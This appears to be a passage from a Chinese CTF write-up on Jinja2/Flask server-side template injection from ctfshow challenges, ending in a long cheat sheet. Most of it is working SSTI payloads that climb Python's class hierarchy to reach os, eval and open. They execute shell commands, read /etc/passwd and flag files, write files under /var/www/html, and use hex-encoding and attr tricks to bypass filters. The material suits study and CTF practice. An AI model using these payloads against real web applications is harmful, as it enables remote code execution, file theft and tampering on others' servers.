                    continue
                yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
            # dict values
            if hasattr(obj, 'items') and callable(obj.items):
                try:
                    for k, v in obj.items():
                        yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
                except:
                    pass
            # items
            elif isinstance(obj, (set, list, tuple, frozenset)):
                for i, v in enumerate(obj):
                    yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
        yield from visit(obj)
    num = 0
    for item in ''.__class__.__mro__[-1].__subclasses__():
        try:
            if item.__init__.__globals__.keys():
                for path, obj in search(item,5):
                    if obj in ('__builtins__','os','eval'):
                        print('[+] ',item,num,path)
            num+=1
        except:
            num+=1
有点慢啊，先让他跑着吧，有结果了再回来更新
### ctfshow web369
过滤单双引号、args、中括号[]、下划线、os、{undefined{、request
request被ban了，突然不知道怎么搞了
    ?name={{%27%27.__class__.__base__.__subclasses__()}}
    ?name={%print(%27%27|attr(class).|attr(base).|attr(subclasses())%}
## 总结
获取基类的几种办法
    [].__class__.__base__
    ''.__class__.__mro__[2]
    ().__class__.__base__
    {}.__class__.__base__
    request.__class__.__mro__[8]   //针对jinjia2/flask为[9]适用
    或者
    [].__class__.__bases__[0]       //其他的类似
    **注意：如果._'这些被过滤了，可以用16进制编码绕过！！！**
    例如：{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()}}
    特别注意用16进制编码之后里面要加"
    __class__            类的一个内置属性，表示实例对象的类。
    __base__             类型对象的直接基类
    __bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
    __mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
    __subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
    __init__             初始化类，返回的类型是function
    __globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
    __dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
    __getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
    __getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
    __builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
    __import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
    __str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
    url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
    get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
    lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
    current_app          应用上下文，一个全局变量。
    request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
    request.args.x1      get传参
    request.values.x1    所有参数
    request.cookies      cookies参数
    request.headers      请求头参数
    request.form.x1      post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
    request.data         post传参 (Content-Type:a/b)
    request.json         post传json  (Content-Type: application/json)
    config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
    g                    {{g}}得到
常用的过滤器，从别的师傅的博客里摘录的：
    int()：将值转换为int类型；
    float()：将值转换为float类型；
    lower()：将字符串转换为小写；
    upper()：将字符串转换为大写；
    title()：把值中的每个单词的首字母都转成大写；
    capitalize()：把变量值的首字母转成大写，其余字母转小写；
    trim()：截取字符串前面和后面的空白字符；
    wordcount()：计算一个长字符串中单词的个数；
    reverse()：字符串反转；
    replace(value,old,new)： 替换将old替换为new的字符串；
    truncate(value,length=255,killwords=False)：截取length长度的字符串；
    striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
    escape()或e：转义字符，会将等符号转义成HTML中的符号。显例：content|escape或content|e。
    safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'hello'|safe}}；
    list()：将变量列成列表；
    string()：将变量转换成字符串；
    join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
    abs()：返回一个数值的绝对值；
    first()：返回一个序列的第一个元素；
    last()：返回一个序列的最后一个元素；
    format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
    length()：返回一个序列或者字典的长度；
    sum()：返回列表内数值的和；
    sort()：返回排序后的列表；
    default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
    length()返回字符串的长度，别名是count
    控制结构 {% %}
    变量取值 {{ }}
    注释 {# #}
    {{[].__class__.__base__.__subclasses__()}}   //查看所有的模块
os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个
利用到的是func_globals.keys() ：查看全局函数
    ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
查看flag文件所在
    {{"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()}}
读取文件 利用到的是object对象下的file类的read函数
    [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
常见的基础调用类函数执行
    >>>''.__class__.__base__.__subclasses__()
    返回子类的列表 [,,,...]
    从中随便选一个类,查看它的__init__
    >>>''.__class__.__base__.__subclasses__()[30].__init__
    wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性
    #再换几个子类，很快就能找到一个重载过__init__的类，比如
    ''.__class__.__base__.__subclasses__()[5].__init__
    ''.__class__.__base__.__subclasses__()[5].__init__.__globals__['__builtins__']['eval']
    然后用eval执行命令即可
    获取基类
    //获取基本类
    {{[].__class__}}
    //获取所有类
    ''.__class__.__mro__[2].__subclasses__()
    获取config对象与request对象类
    {{url_for.__globals__}}
    {{config}}#即查看权限
    {{ config.SQLALCHEMY_DATABASE_URI }}
    python2
    #读取文件类， file位置一般为40，直接调用
    [].__class__.__base__.__subclasses__()[40]('fl4g').read()
     #调用os的popen执行命令
    {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
    [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()
    [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()
    #如果system被过滤，用os的listdir读取目录+file模块读取文件：
    ().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')
     位置一般为258
    {{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
    {{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
    {{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
    #一般位置为59，可以用它来调用file、os、eval、commands等
    #调用file
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()      #把 read() 改为 write() 就是写文件
    #读文件
    ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
    object.__subclasses__()[40](r'C:\1.php').read()
    #写文件
    ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
    object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')
    #调用eval
    [].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")
    #调用system方法
    >>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
    #调用commands进行命令执行
    {}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
    python3
    #读取文件与写文件类
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
    #执行命令
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
    #命令执行：
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
    #文件操作
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}